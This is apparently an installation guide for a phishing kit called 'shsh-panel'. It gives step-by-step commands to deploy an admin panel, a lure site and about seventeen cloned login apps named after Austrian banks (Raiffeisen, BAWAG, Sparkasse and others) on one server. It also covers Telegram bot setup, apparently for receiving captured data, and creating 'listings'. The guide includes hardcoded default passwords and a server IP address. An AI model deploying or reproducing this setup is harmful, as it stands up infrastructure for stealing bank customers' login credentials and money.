# Installation Guide

Step-by-step setup on a fresh Ubuntu 24.04 server. Takes about 10 minutes.

---

## Requirements

| What | Minimum |
|------|---------|
| OS | Ubuntu 24.04 LTS |
| CPU | 4 vCPU |
| RAM | 8 GB (16 GB recommended) |
| Disk | 80 GB NVMe SSD |
| Access | Root SSH |

---

## Option A: One-Click Deploy

```bash
# Upload project to server
scp -r shsh_final/ root@YOUR_SERVER_IP:/root/shsh_final/

# SSH in
ssh root@YOUR_SERVER_IP

# Run the deploy script
cd /root/shsh_final
chmod +x deploy.sh
./deploy.sh
```

Done. The script handles everything — packages, database, builds, PM2, nginx.

---

## Option B: Manual Setup

### 1. System packages

```bash
apt update && apt install -y nginx postgresql postgresql-contrib curl git
```

### 2. Node.js 24

```bash
curl -fsSL https://deb.nodesource.com/setup_24.x | bash -
apt install -y nodejs
npm install -g pm2
```

### 3. PostgreSQL

```bash
sudo -u postgres psql -c "CREATE USER shsh WITH PASSWORD 'shsh_secure_2024';"
sudo -u postgres psql -c "CREATE DATABASE shsh_panel OWNER shsh;"
sudo -u postgres psql -c "ALTER USER shsh CREATEDB;"
```

### 4. Restore database

```bash
sudo -u postgres pg_restore --no-owner --no-acl -d shsh_panel database/shsh_panel_final.dump
sudo -u postgres psql -d shsh_panel -c "GRANT ALL ON ALL TABLES IN SCHEMA public TO shsh;"
sudo -u postgres psql -d shsh_panel -c "GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO shsh;"
```

### 5. Copy project files

```bash
cp -R shsh-panel /opt/shsh-panel
cp -R banks /opt/banks
```

### 6. Configure environment

Replace `YOUR_IP` with your server's public IP:

```bash
# Panel .env
cat > /opt/shsh-panel/.env << EOF
DATABASE_URL="postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel"
NEXTAUTH_SECRET="$(openssl rand -hex 32)"
NEXTAUTH_URL="http://YOUR_IP:8500"
NEXT_PUBLIC_SITE_URL="http://YOUR_IP:3001"
EOF

# Bank .env files (all banks point to the panel)
for dir in /opt/banks/*/; do
  echo "NEXT_PUBLIC_PANEL_URL=http://YOUR_IP:8500" > "$dir/.env"
done
```

### 7. Install & build

```bash
# Panel
cd /opt/shsh-panel
npm install --production=false
npx prisma generate
npm run build

# Site
cd /opt/shsh-panel/site
npm install
npm run build

# Banks (all of them)
for dir in /opt/banks/*/; do
  cd "$dir" && npm install && npm run build
done
```

### 8. Start with PM2

```bash
cd /opt/shsh-panel && pm2 start npm --name panel -- start -- -p 8500
cd /opt/shsh-panel/site && pm2 start npm --name site -- start -- -p 3001
cd /opt/banks/vkb-login && pm2 start npm --name vkb -- start -- -p 3010
cd /opt/banks/oberbank-login && pm2 start npm --name oberbank -- start -- -p 3011
cd /opt/banks/bank99-login && pm2 start npm --name bank99 -- start -- -p 3012
cd /opt/banks/hypo-login && pm2 start npm --name hypo -- start -- -p 3013
cd /opt/banks/raiffeisen-login && pm2 start npm --name raiffeisen -- start -- -p 3014
cd /opt/banks/austria-next && pm2 start npm --name bank-austria -- start -- -p 3015
cd /opt/banks/burgenland-next && pm2 start npm --name burgenland -- start -- -p 3016
cd /opt/banks/hypo-vorarlberg-next && pm2 start npm --name hypo-vorarlberg -- start -- -p 3017
cd /opt/banks/hyponoe-next && pm2 start npm --name hypo-noe -- start -- -p 3018
cd /opt/banks/hypotirol-next && pm2 start npm --name hypotirol -- start -- -p 3019
cd /opt/banks/mypaylife-next && pm2 start npm --name mypaylife -- start -- -p 3020
cd /opt/banks/poso-next && pm2 start npm --name poso -- start -- -p 3021
cd /opt/banks/volks-next && pm2 start npm --name volksbank -- start -- -p 3022
cd /opt/banks/bawag-next && pm2 start npm --name bawag -- start -- -p 3023
cd /opt/banks/easybank-next && pm2 start npm --name easybank -- start -- -p 3024
cd /opt/banks/sparkasse-next && pm2 start npm --name sparkasse -- start -- -p 3025
cd /opt/banks/bks-next && pm2 start npm --name bks -- start -- -p 3026

pm2 save
pm2 startup
```

### 9. Nginx

```bash
cp configs/nginx/sites-enabled/shsh-panel /etc/nginx/sites-enabled/shsh-panel
# Edit the file — replace 144.31.106.50 with YOUR_IP if needed
nginx -t && systemctl reload nginx
```

---

## After Install

1. Open `http://YOUR_IP:8500/login`
2. Login: `admin` / `admin123`
3. Go to Settings — configure Telegram bot token + chat ID
4. Go to Banks — enable/disable banks as needed
5. Create your first listing

---

## Updating

To update the code on an existing server:

```bash
# Upload new files (from your local machine)
rsync -avz --exclude='node_modules' --exclude='.next' --exclude='.env' \
  shsh-panel/ root@SERVER:/opt/shsh-panel/
rsync -avz --exclude='node_modules' --exclude='.next' --exclude='.env' \
  banks/ root@SERVER:/opt/banks/

# SSH in and rebuild
ssh root@SERVER
cd /opt/shsh-panel && npm run build
cd /opt/shsh-panel/site && npm run build
for dir in /opt/banks/*/; do cd "$dir" && npm run build; done
pm2 restart all
```

---

## Ports Reference

| Service | Port |
|---------|------|
| Panel | 8500 |
| Site | 3001 |
| VKB | 3010 |
| Oberbank | 3011 |
| Bank99 | 3012 |
| Hypobank | 3013 |
| Raiffeisen | 3014 |
| Bank Austria | 3015 |
| Burgenland | 3016 |
| Hypo Vorarlberg | 3017 |
| Hypo NOE | 3018 |
| Hypo Tirol | 3019 |
| Mypaylife | 3020 |
| Poso | 3021 |
| Volksbank | 3022 |
| BAWAG | 3023 |
| easybank | 3024 |
| Sparkasse | 3025 |
| BKS | 3026 |
